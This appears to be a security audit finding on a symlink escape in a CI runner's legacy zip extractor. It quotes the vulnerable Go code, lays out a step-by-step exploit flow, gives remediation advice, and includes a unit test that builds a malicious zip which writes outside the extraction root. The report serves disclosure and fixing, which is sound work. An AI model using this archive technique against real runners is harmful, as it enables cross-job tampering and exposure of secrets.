### Title
Legacy zip extractor follows attacker-created symlinks during restore, allowing writes outside the cache/artifact root - (File: helpers/archives/zip_extract.go)

### Summary
`extractZipSymlinkEntry` and `extractZipFile` in `helpers/archives/zip_extract.go` create symlinks from arbitrary attacker-controlled zip entry data with no validation of the link target and no bound check that the resulting path stays inside the extraction root. Because `ExtractZipArchive` iterates archive entries in file order and writes each entry's path (`file.Name`) directly with `os.Remove`/`os.OpenFile`/`os.Symlink`/`os.MkdirAll`, an attacker-crafted cache or artifact archive can plant a directory symlink pointing outside the root and then have a later entry with a path nested "inside" that symlinked directory, causing the subsequent file write to be redirected to the symlink target outside the intended restore root.

### Finding Description
`extractZipFile` dispatches on `file.Mode()&os.ModeType`, calling `extractZipSymlinkEntry` for symlink entries and `extractZipFileEntry` for regular files, using `file.Name` verbatim as the filesystem path in both cases: [1](#0-0) 

`extractZipSymlinkEntry` reads the symlink target from the zip entry's *content* (fully attacker-controlled bytes) and creates the link with no validation that the target is inside the restore root, and no rejection of absolute paths or `..` segments: [2](#0-1) 

`extractZipFileEntry` removes and recreates whatever is at `file.Name`: [3](#0-2) 

The only sanitation performed anywhere in `ExtractZipArchive` is a `.git`-directory warning check, `errorIfGitDirectory`, which does nothing to block path traversal or symlink escapes: [4](#0-3) [5](#0-4) 

Exploit flow:
1. Attacker crafts a zip archive with entry `linkdir` of type symlink whose content (link target) is a path that escapes the restore root, e.g. `../../../../some/trusted/path` (or an absolute path).
2. A second entry `linkdir/payload` (regular file) follows in the same archive.
3. During extraction, `extractZipFile` first creates the `linkdir` symlink pointing outside the root via `os.Symlink`.
4. For `linkdir/payload`, `extractZipFile` calls `os.MkdirAll(filepath.Dir("linkdir/payload"))` — this resolves `linkdir` as an existing directory (through the symlink) and does not error.
5. `extractZipFileEntry` then calls `os.Remove("linkdir/payload")` and `os.OpenFile("linkdir/payload", O_CREATE|O_TRUNC, ...)`. Both of these follow the symlinked intermediate directory component during path resolution (only the *final* path component's own symlink-ness is not followed by `os.Remove`/`os.OpenFile`, but an intermediate directory symlink in the path *is* followed), so the write actually lands at `some/trusted/path/payload` outside the restore root.

This is reachable through the legacy zip cache/artifact extraction path: `CacheExtractorCommand.Execute` sets the working directory to the build's restore root and hands the downloaded/attacker-influenced archive to `archive.NewExtractor`, which for the legacy zip format (`commands/helpers/archive/ziplegacy/zip_legacy_extractor.go`) calls `archives.ExtractZipArchive(zr)` directly with no chroot bound check: [6](#0-5) [7](#0-6) 

Notably, the runner's *other* archive formats already implement exactly the bound check this file lacks — `tarzstd` extractor explicitly resolves and validates each path against the extraction directory before writing, and defers symlink creation until after the target existence is confirmed: [8](#0-7) 
This confirms the legacy zip path is missing a check that other extractors in the same codebase already implement, i.e., this is a real gap rather than an inherent limitation.

### Impact Explanation
An unprivileged pipeline author who controls the contents of a cache key or artifact archive consumed by a job (their own job, or — depending on cache-key scoping/collisions — another job's restore step) can cause the runner helper process to create/overwrite files outside the intended cache/artifact restore root on the executor filesystem. Depending on executor type (shell/docker executors on shared hosts, or where cache/artifact roots share a filesystem with other sensitive paths) this can result in cross-job tampering (poisoning files that a later job trusts) or overwriting/reading files outside the sandboxed build directory, matching the "cross-job tampering or secret exposure through symlink escape" impact class described.

### Likelihood Explanation
Preconditions are minimal: the attacker only needs to be able to produce or influence a cache/artifact zip archive that the runner will download and extract via the legacy zip extractor path (`ExtractZipArchive`), which is a normal, unprivileged capability for any GitLab user defining `cache`/`artifacts` in `.gitlab-ci.yml`. The bug is deterministic and repeatable — it doesn't depend on race conditions or timing, only entry ordering within the zip, which the attacker fully controls when building the archive.

### Recommendation
In `helpers/archives/zip_extract.go`, before performing any filesystem operation for an entry:
- Reject entry names containing `..` path segments or absolute paths, and canonicalize (`filepath.Clean`/`filepath.Join` against the root, then verify the resulting absolute path has the root as prefix) similarly to the check already implemented in `tarzstd_extractor.go`'s `Extract` (`filepath.Abs` + `strings.HasPrefix(path, e.dir+separator)`).
- For symlink entries, validate the link target the same way: resolve `file.Name`'s directory plus the target and reject targets (absolute or relative) that resolve outside the root.
- Defer symlink creation to a second pass (after regular files/directories are written) and validate no already-written file path traverses through an attacker-created symlink before writing — i.e., verify each parent directory component of a path is not itself a symlink escaping the root, or use `openat`-style safe-open semantics that don't follow symlinks in intermediate path components outside the checked root.

### Proof of Concept
Go unit test (fits in `helpers/archives/zip_extract_test.go`):
```go
func TestExtractZipFile_SymlinkDirEscape(t *testing.T) {
    testInWorkDir(t, func(t *testing.T, fileName string) {
        outsideDir := t.TempDir()
        outsideTarget := filepath.Join(outsideDir, "payload")

        f, err := os.Create(fileName)
        require.NoError(t, err)
        zw := zip.NewWriter(f)

        // 1. symlink entry "linkdir" -> outsideDir (escape root)
        hdr := &zip.FileHeader{Name: "linkdir"}
        hdr.SetMode(os.ModeSymlink | 0777)
        w, _ := zw.CreateHeader(hdr)
        _, _ = w.Write([]byte(outsideDir))

        // 2. regular file "linkdir/payload" written through the symlink
        hdr2 := &zip.FileHeader{Name: "linkdir/payload"}
        hdr2.SetMode(0644)
        w2, _ := zw.CreateHeader(hdr2)
        _, _ = w2.Write([]byte("attacker-controlled content"))

        require.NoError(t, zw.Close())
        require.NoError(t, f.Close())

        err = ExtractZipFile(fileName)
        require.NoError(t, err)

        // Assert: file was written OUTSIDE the extraction root
        _, statErr := os.Stat(outsideTarget)
        assert.NoError(t, statErr, "expected write to escape root via symlink pivot")
        content, _ := os.ReadFile(outsideTarget)
        assert.Equal(t, "attacker-controlled content", string(content))
    })
}
```
Expected result on the vulnerable code: the assertion `os.Stat(outsideTarget)` succeeds and `outsideTarget` contains attacker content, proving the write escaped `t.TempDir()`'s extraction root — demonstrating the symlink pivot. A fixed implementation should cause `ExtractZipFile` to reject/skip the `linkdir/payload` entry (or error out) and `outsideTarget` must not exist.

### Citations

**File:** helpers/archives/zip_extract.go (L22-39)
```go
func extractZipSymlinkEntry(file *zip.File) (err error) {
	var data []byte
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	data, err = io.ReadAll(in)
	if err != nil {
		return err
	}

	// Remove symlink before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	err = os.Symlink(string(data), file.Name)
	return
}
```

**File:** helpers/archives/zip_extract.go (L41-59)
```go
func extractZipFileEntry(file *zip.File) (err error) {
	var out *os.File
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	// Remove file before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	out, err = os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode().Perm())
	if err != nil {
		return err
	}
	defer func() { _ = out.Close() }()
	_, err = io.Copy(out, in)

	return
}
```

**File:** helpers/archives/zip_extract.go (L61-83)
```go
func extractZipFile(file *zip.File) (err error) {
	// Create all parents to extract the file
	err = os.MkdirAll(filepath.Dir(file.Name), 0o777)
	if err != nil {
		return err
	}

	switch file.Mode() & os.ModeType {
	case os.ModeDir:
		err = extractZipDirectoryEntry(file)

	case os.ModeSymlink:
		err = extractZipSymlinkEntry(file)

	case os.ModeNamedPipe, os.ModeSocket, os.ModeDevice:
		// Ignore files of these types
		logrus.Warningf("File ignored: %q", file.Name)

	default:
		err = extractZipFileEntry(file)
	}
	return
}
```

**File:** helpers/archives/zip_extract.go (L85-96)
```go
func ExtractZipArchive(archive *zip.Reader) error {
	tracker := newPathErrorTracker()

	for _, file := range archive.File {
		if err := errorIfGitDirectory(file.Name); tracker.actionable(err) {
			printGitArchiveWarning("extract")
		}

		if err := extractZipFile(file); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}
	}
```

**File:** helpers/archives/path_check_helper.go (L21-31)
```go
func errorIfGitDirectory(path string) *os.PathError {
	if !isPathAGitDirectory(path) {
		return nil
	}

	return &os.PathError{
		Op:   ".git inside of archive",
		Path: path,
		Err:  errors.New("trying to archive or extract .git path"),
	}
}
```

**File:** commands/helpers/archive/ziplegacy/zip_legacy_extractor.go (L24-32)
```go
// Extract extracts files from the reader to the directory passed to
// NewZipExtractor.
func (e *extractor) Extract(ctx context.Context) error {
	zr, err := zip.NewReader(e.r, e.size)
	if err != nil {
		return err
	}

	return archives.ExtractZipArchive(zr)
```

**File:** commands/helpers/cache_extractor.go (L646-663)
```go
	f, size, format, err := openArchive(c.File)
	if os.IsNotExist(err) {
		warningln("Cache file does not exist")
	}
	if err != nil {
		logrus.Fatalln(err)
	}
	defer f.Close()

	extractor, err := archive.NewExtractor(format, f, size, wd)
	if err != nil {
		logrus.Fatalln(err)
	}

	err = extractor.Extract(context.Background())
	if err != nil {
		logrus.Fatalln(err)
	}
```

**File:** commands/helpers/archive/tarzstd/tarzstd_extractor.go (L56-77)
```go

		var path string
		path, err = filepath.Abs(filepath.Join(e.dir, hdr.Name))
		if err != nil {
			return err
		}
		if !strings.HasPrefix(path, e.dir+string(filepath.Separator)) && path != e.dir {
			return fmt.Errorf("%s cannot be extracted outside of chroot (%s)", path, e.dir)
		}

		if err := os.MkdirAll(filepath.Dir(path), 0777); err != nil {
			return err
		}

		if ctx.Err() != nil {
			return ctx.Err()
		}

		switch {
		case fi.Mode()&os.ModeSymlink != 0:
			deferred[path] = hdr
			continue
```
